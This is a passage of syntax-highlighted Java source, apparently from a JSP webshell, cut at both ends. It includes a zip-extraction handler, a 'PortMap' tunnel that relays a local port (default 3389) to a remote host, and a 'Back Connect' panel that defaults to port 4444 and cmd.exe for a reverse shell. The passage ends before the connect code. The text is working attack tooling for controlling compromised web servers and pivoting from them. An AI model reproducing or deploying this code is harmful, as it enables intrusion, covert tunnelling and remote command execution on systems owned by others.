(Util.<span class="built_in">isEmpty</span>(savepath) || Util.<span class="built_in">isEmpty</span>(zipfile))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">File save = <span class="keyword">new</span> File(savepath);</span></span><br><span class="line"><span class="vbscript">save.mkdirs();</span></span><br><span class="line"><span class="vbscript">ZipFile file = <span class="keyword">new</span> ZipFile(<span class="keyword">new</span> File(zipfile));   </span></span><br><span class="line"><span class="vbscript">Enumeration e = file.entries();   </span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (e.hasMoreElements()) &#123;   </span></span><br><span class="line"><span class="vbscript">ZipEntry en = (ZipEntry) e.nextElement(); </span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> entryPath = en.getName();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> index = entryPath.lastIndexOf(<span class="string">"/"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (index != <span class="number">-1</span>)</span></span><br><span class="line"><span class="vbscript">entryPath = entryPath.substring(<span class="number">0</span>,index);</span></span><br><span class="line"><span class="vbscript">File absEntryFile = <span class="keyword">new</span> File(save,entryPath);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!absEntryFile.exists() &amp;&amp; (en.isDirectory() || en.getName().indexOf(<span class="string">"/"</span>) != <span class="number">-1</span>)) </span></span><br><span class="line"><span class="vbscript">absEntryFile.mkdirs();</span></span><br><span class="line"><span class="vbscript">BufferedOutputStream output = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">BufferedInputStream input = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">output = <span class="keyword">new</span> BufferedOutputStream(   </span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(save,en.getName())));   </span></span><br><span class="line"><span class="vbscript">input = <span class="keyword">new</span> BufferedInputStream(   </span></span><br><span class="line"><span class="vbscript">file.getInputStream(en));   </span></span><br><span class="line"><span class="vbscript">byte[] b = <span class="keyword">new</span> byte[<span class="number">1024</span>];   </span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = input.read(b);   </span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="built_in">len</span> != <span class="number">-1</span>) &#123;   </span></span><br><span class="line"><span class="vbscript">output.write(b, <span class="number">0</span>, <span class="built_in">len</span>);   </span></span><br><span class="line"><span class="vbscript"><span class="built_in">len</span> = input.read(b);   </span></span><br><span class="line"><span class="vbscript">&#125;   </span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception ex) &#123;</span></span><br><span class="line"><span class="vbscript">&#125; finally &#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (output != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">output.close();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (input != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">input.close();</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception ex1) &#123;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">file.close();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Unzip File Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//VMapPort</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VmpInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">Object localIP = JSession.getAttribute(<span class="string">"localIP"</span>);</span></span><br><span class="line"><span class="vbscript">Object localPort = JSession.getAttribute(<span class="string">"localPort"</span>);</span></span><br><span class="line"><span class="vbscript">Object remoteIP = JSession.getAttribute(<span class="string">"remoteIP"</span>);</span></span><br><span class="line"><span class="vbscript">Object remotePort = JSession.getAttribute(<span class="string">"remotePort"</span>);</span></span><br><span class="line"><span class="vbscript">Object done = JSession.getAttribute(<span class="string">"done"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"localIP"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"localPort"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"remoteIP"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"remotePort"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"done"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(localIP))</span></span><br><span class="line"><span class="vbscript">localIP = InetAddress.getLocalHost().getHostAddress();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(localPort))</span></span><br><span class="line"><span class="vbscript">localPort = <span class="string">"3389"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(remoteIP))</span></span><br><span class="line"><span class="vbscript">remoteIP = <span class="string">"www.forjj.com"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(remotePort))</span></span><br><span class="line"><span class="vbscript">remotePort = <span class="string">"80"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(done))</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,done.toString());</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>mapPort\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td&gt;&lt;h2 id=\"</span>Bin_H2_Title\<span class="string">"&gt;PortMap &amp;gt;&amp;gt;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;div id=\"</span>hOWTm\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">4</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">" style=\"</span>margin:<span class="number">10</span>px <span class="number">0</span>;\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;tr align=\"</span>center\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td style=\"</span>width:<span class="number">5</span>%\<span class="string">"&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td style=\"</span>width:<span class="number">20</span>%\<span class="string">" align=\"</span><span class="built_in">left</span>\<span class="string">"&gt;Local Ip :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>localIP\<span class="string">" id=\"</span>localIP\<span class="string">" type=\"</span>text\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\""+localIP+"</span>\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td style=\"</span>width:<span class="number">20</span>%\<span class="string">" align=\"</span><span class="built_in">left</span>\<span class="string">"&gt;Local Port :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>localPort\<span class="string">" id=\"</span>localPort\<span class="string">" type=\"</span>text\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\""+localPort+"</span>\<span class="string">" /&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td style=\"</span>width:<span class="number">20</span>%\<span class="string">" align=\"</span><span class="built_in">left</span>\<span class="string">"&gt;Remote Ip :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>remoteIP\<span class="string">" id=\"</span>remoteIP\<span class="string">" type=\"</span>text\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\""+remoteIP+"</span>\<span class="string">" /&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td style=\"</span>width:<span class="number">20</span>%\<span class="string">" align=\"</span><span class="built_in">left</span>\<span class="string">"&gt;Remote Port :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>remotePort\<span class="string">" id=\"</span>remotePort\<span class="string">" type=\"</span>text\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\""+remotePort+"</span>\<span class="string">" /&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;tr align=\"</span>center\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td colspan=\"</span><span class="number">5</span>\<span class="string">"&gt;&lt;br/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input type=\"</span>submit\<span class="string">" name=\"</span>FJE\<span class="string">" value=\"</span>MapPort\<span class="string">" id=\"</span>FJE\<span class="string">" class=\"</span>bt\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;input type=\"</span>button\<span class="string">" name=\"</span>giX\<span class="string">" value=\"</span>ClearAll\<span class="string">" id=\"</span>giX\<span class="string">" onClick=\"</span>location.href=<span class="comment">'"+SHELL_NAME+"?o=smp'\" class=\"bt\" /&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;/table&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/div&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//StopMapPort</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> SmpInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">true</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">true</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">Object obj = JSession.getAttribute(PORT_MAP);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">ServerSocket <span class="built_in">server</span> = (ServerSocket)JSession.getAttribute(PORT_MAP);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">server</span>.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"done"</span>,<span class="string">"Stop Success!"</span>);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"vmp"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> MapPortInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> localIP = <span class="built_in">request</span>.getParameter(<span class="string">"localIP"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> localPort = <span class="built_in">request</span>.getParameter(<span class="string">"localPort"</span>);</span></span><br><span class="line"><span class="vbscript">final <span class="built_in">String</span> remoteIP = <span class="built_in">request</span>.getParameter(<span class="string">"remoteIP"</span>);</span></span><br><span class="line"><span class="vbscript">final <span class="built_in">String</span> remotePort = <span class="built_in">request</span>.getParameter(<span class="string">"remotePort"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(localIP) || Util.<span class="built_in">isEmpty</span>(localPort) || Util.<span class="built_in">isEmpty</span>(remoteIP) || Util.<span class="built_in">isEmpty</span>(remotePort))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">Object obj = JSession.getAttribute(PORT_MAP);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">ServerSocket s = (ServerSocket)obj;</span></span><br><span class="line"><span class="vbscript">s.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">final ServerSocket <span class="built_in">server</span> = <span class="keyword">new</span> ServerSocket();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">server</span>.bind(<span class="keyword">new</span> InetSocketAddress(localIP,Integer.parseInt(localPort)));</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(PORT_MAP,<span class="built_in">server</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable()&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void run()&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="vbscript">Socket soc = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">Socket remoteSoc = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">DataInputStream remoteIn = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">DataOutputStream remoteOut = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">DataInputStream localIn = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">DataOutputStream localOut = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript">soc = <span class="built_in">server</span>.accept();</span></span><br><span class="line"><span class="vbscript">remoteSoc = <span class="keyword">new</span> Socket();</span></span><br><span class="line"><span class="vbscript">remoteSoc.connect(<span class="keyword">new</span> InetSocketAddress(remoteIP,Integer.parseInt(remotePort)));</span></span><br><span class="line"><span class="vbscript">remoteIn = <span class="keyword">new</span> DataInputStream(remoteSoc.getInputStream());</span></span><br><span class="line"><span class="vbscript">remoteOut = <span class="keyword">new</span> DataOutputStream(remoteSoc.getOutputStream());</span></span><br><span class="line"><span class="vbscript">localIn = <span class="keyword">new</span> DataInputStream(soc.getInputStream());</span></span><br><span class="line"><span class="vbscript">localOut = <span class="keyword">new</span> DataOutputStream(soc.getOutputStream());</span></span><br><span class="line"><span class="vbscript">this.readFromLocal(localIn,remoteOut);</span></span><br><span class="line"><span class="vbscript">this.readFromRemote(soc,remoteSoc,remoteIn,localOut);</span></span><br><span class="line"><span class="vbscript">&#125;catch(Exception ex)</span></span><br><span class="line"><span class="vbscript">&#123;								</span></span><br><span class="line"><span class="vbscript">break;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void readFromLocal(final DataInputStream localIn,final DataOutputStream remoteOut)&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable()&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void run()&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript">byte[] data = <span class="keyword">new</span> byte[<span class="number">100</span>];</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = localIn.read(data);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="built_in">len</span> != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">remoteOut.write(data,<span class="number">0</span>,<span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">len</span> = localIn.read(data);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">break;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;).start();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void readFromRemote(final Socket soc,final Socket remoteSoc,final DataInputStream remoteIn,final DataOutputStream localOut)&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable()&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void run()&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript">byte[] data = <span class="keyword">new</span> byte[<span class="number">100</span>];</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = remoteIn.read(data);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="built_in">len</span> != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">localOut.write(data,<span class="number">0</span>,<span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">len</span> = remoteIn.read(data);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript">soc.close();</span></span><br><span class="line"><span class="vbscript">remoteSoc.close();</span></span><br><span class="line"><span class="vbscript">&#125;catch(Exception ex) &#123;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">break;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;).start();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;).start();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"done"</span>,<span class="string">"Map Port Success!"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"localIP"</span>,localIP);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"localPort"</span>,localPort);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"remoteIP"</span>,remoteIP);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"remotePort"</span>,remotePort);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=vmp"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//VBackConnect</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VbcInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">Object ip = JSession.getAttribute(<span class="string">"ip"</span>);</span></span><br><span class="line"><span class="vbscript">Object port = JSession.getAttribute(<span class="string">"port"</span>);</span></span><br><span class="line"><span class="vbscript">Object program = JSession.getAttribute(<span class="string">"program"</span>);</span></span><br><span class="line"><span class="vbscript">Object done = JSession.getAttribute(<span class="string">"done"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"ip"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"port"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"program"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"done"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(ip))</span></span><br><span class="line"><span class="vbscript">ip = <span class="built_in">request</span>.getRemoteAddr();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(port) || !Util.isInteger(port.toString()))</span></span><br><span class="line"><span class="vbscript">port = <span class="string">"4444"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(program))</span></span><br><span class="line"><span class="vbscript">program = <span class="string">"cmd.exe"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(done))</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,done.toString());</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>backConnect\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td&gt;&lt;h2 id=\"</span>Bin_H2_Title\<span class="string">"&gt;Back Connect &amp;gt;&amp;gt;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;div id=\"</span>hOWTm\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">4</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">" style=\"</span>margin:<span class="number">10</span>px <span class="number">0</span>;\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;tr align=\"</span>center\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td style=\"</span>width:<span class="number">5</span>%\<span class="string">"&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td  align=\"</span>center\<span class="string">"&gt;Your Ip :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>ip\<span class="string">" id=\"</span>ip\<span class="string">" type=\"</span>text\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\""+ip+"</span>\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          Your Port :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>port\<span class="string">" id=\"</span>port\<span class="string">" type=\"</span>text\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\""+port+"</span>\<span class="string">" /&gt;Program To Back :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>program\<span class="string">" id=\"</span>program\<span class="string">" type=\"</span>text\<span class="string">" value=\""+program+"</span>\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\"</span>d\<span class="string">" /&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;tr align=\"</span>center\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td colspan=\"</span><span class="number">2</span>\<span class="string">"&gt;&lt;br/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input type=\"</span>submit\<span class="string">" name=\"</span>FJE\<span class="string">" value=\"</span>Connect\<span class="string">" id=\"</span>FJE\<span class="string">" class=\"</span>bt\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;/table&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/div&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> BackConnectInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span 